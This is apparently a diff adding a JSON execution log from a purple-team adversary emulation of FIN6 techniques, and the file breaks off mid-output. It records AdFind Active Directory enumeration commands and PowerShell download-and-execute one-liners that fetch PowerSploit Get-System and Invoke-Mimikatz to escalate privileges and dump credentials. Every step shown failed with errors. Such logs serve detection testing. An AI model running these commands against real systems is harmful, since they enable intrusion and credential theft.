@@ -1,0 +1,479 @@
+{
+    "attire-version": "1.1",
+    "execution-data": {
+        "execution-command": "python calderalone.py",
+        "execution-id": "ojyrji",
+        "execution-source": "Calder-alone",
+        "execution-category": {
+            "name": "Calder-alone",
+            "abbreviation": "CDA"
+        },
+        "target": {
+            "host": "vcs",
+            "ip": "0.0.0.0",
+            "path": "PATH=C:",
+            "user": "vcs-purple-team"
+        },
+        "time-generated": "2024-10-01T07:44:08.000Z"
+    },
+    "procedures": [
+        {
+            "procedure-name": "Enumerate AD person objects",
+            "procedure-description": "Find all person objects and output the results to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "e44a39ce-0651-3ddd-8f05-f83aa2ffd657"
+            },
+            "mitre-technique-id": "T1087.002",
+            "order": 1,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -f (objectcategory=person) > ad_users.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Enumerate AD computer objects",
+            "procedure-description": "Identify all computer objects and output the results to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "5b24eef2-7a7f-4d34-8cab-e588074c59bc"
+            },
+            "mitre-technique-id": "T1018",
+            "order": 2,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -f (objectcategory=computer) > ad_computers.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Enumerate AD Organizational Units",
+            "procedure-description": "Enumerate all Organizational Units (OUs) in the domain of the user running the command and output the results to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "d30692dd-779f-4a40-b947-de23dabbb033"
+            },
+            "mitre-technique-id": "T1482",
+            "order": 3,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -f (objectcategory=organizationalUnit) > ad_ous.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Enumerate AD trust objects",
+            "procedure-description": "Performs a full forest search and dumps trust objects to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "02a96c18-f700-482d-88a8-bd311f6c41dc"
+            },
+            "mitre-technique-id": "T1482",
+            "order": 4,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -gcb -sc trustdmp > ad_trustdmp.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Enumerate AD subnets",
+            "procedure-description": "List subnets and output the results to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "e4cdb5c6-d322-3b6e-ac8e-68b2e8a7dd4c"
+            },
+            "mitre-technique-id": "T1016",
+            "order": 5,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -subnets -f (objectCategory=subnet) > ad_subnets.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "Enumerate AD groups",
+            "procedure-description": "List groups and output the results to a text file.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "2738b811-a360-4a4f-af9d-704343ebab4d"
+            },
+            "mitre-technique-id": "T1069.002",
+            "order": 6,
+            "steps": [
+                {
+                    "command": "\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\" -f (objectcategory=group) > ad_group.txt",
+                    "executor": "cmd",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:08.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "'\\\"C:\\Users\\thanh\\adversary-emulation-plans\\tmpn7ulh99s\\payloads\\adfind.exe\\\"' is not recognized as an internal or external command,\noperable program or batch file.\n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "PowerSploit Named-Pipe Impersonation",
+            "procedure-description": "PowerSploit named-pipe impersonation, similar to the technique used to escalate to SYSTEM-level privileges by FIN6.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "a89ea459-97ec-28fd-a552-9d305f023bbe"
+            },
+            "mitre-technique-id": "T1134",
+            "order": 7,
+            "steps": [
+                {
+                    "command": "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'\"",
+                    "executor": "psh",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:08.000Z",
+                    "time-stop": "2024-10-01T07:44:13.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "Get-System : [Get-System] Script must be run as administrator\nAt line:1 char:143\n+ ... c/Get-System.ps1'); Get-System -ServiceName 'mstdc' -PipeName 'mstdc'\n+                         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [Write-Error], WriteErrorException\n    + FullyQualifiedErrorId : Microsoft.PowerShell.Commands.WriteErrorException,Get-System\n \n",
+                            "level": "STDERR",
+                            "type": "console"
+                        }
+                    ]
+                }
+            ]
+        },
+        {
+            "procedure-name": "PowerSploit Invoke-Mimikatz",
+            "procedure-description": "Dump credentials from memory via PowerShell by invoking a remote Mimikatz script, similar to the procedure used by FIN6.",
+            "procedure-id": {
+                "type": "guid",
+                "id": "ff77db3d-ded1-48da-9885-8dfc097edec0"
+            },
+            "mitre-technique-id": "T1003.001",
+            "order": 8,
+            "steps": [
+                {
+                    "command": "powershell.exe -exec bypass -C \"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds\"",
+                    "executor": "psh",
+                    "order": 1,
+                    "time-start": "2024-10-01T07:44:13.000Z",
+                    "time-stop": "2024-10-01T07:44:21.000Z",
+                    "output": [
+                        {
+                            "content": "",
+                            "level": "STDOUT",
+                            "type": "console"
+                        },
+                        {
+                            "content": "Exception calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:489 char:3\n+         $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::Get ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:494 char:3\n+         $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:499 char:3\n+         $memcpy = [System.Runtime.InteropServices.Marshal]::GetDelega ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:504 char:3\n+         $memset = [System.Runtime.InteropServices.Marshal]::GetDelega ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:509 char:3\n+         $LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:514 char:3\n+         $GetProcAddress = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:519 char:3\n+         $GetProcAddressOrdinal = [System.Runtime.InteropServices.Mars ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:524 char:3\n+         $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:529 char:3\n+         $VirtualFreeEx = [System.Runtime.InteropServices.Marshal]::Ge ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:534 char:3\n+         $VirtualProtect = [System.Runtime.InteropServices.Marshal]::G ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:539 char:3\n+         $GetModuleHandle = [System.Runtime.InteropServices.Marshal]:: ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:544 char:3\n+         $FreeLibrary = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:549 char:6\n+         $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetD ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:554 char:6\n+         $WaitForSingleObject = [System.Runtime.InteropServices.Marsha ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:559 char:9\n+         $WriteProcessMemory = [System.Runtime.InteropServices.Marshal ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:564 char:9\n+         $ReadProcessMemory = [System.Runtime.InteropServices.Marshal] ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodException\n    + FullyQualifiedErrorId : MethodCountCouldNotFindBest\n \nException calling \"GetMethod\" with \"1\" argument(s): \"Ambiguous match found.\"\nAt line:886 char:6\n+         $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddr ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException\n    + FullyQualifiedErrorId : AmbiguousMatchException\n \nYou cannot call a method on a null-valued expression.\nAt line:893 char:6\n+         Write-Output $GetProcAddress.Invoke($null, @([System.Runtime. ...\n+         ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\n    + CategoryInfo          : InvalidOperation: (:) [], RuntimeException\n    + FullyQualifiedErrorId : InvokeMethodOnNull\n \nCannot find an overload for \"GetDelegateForFunctionPointer\" and the argument count: \"2\".\nAt line:569 char:9\n+         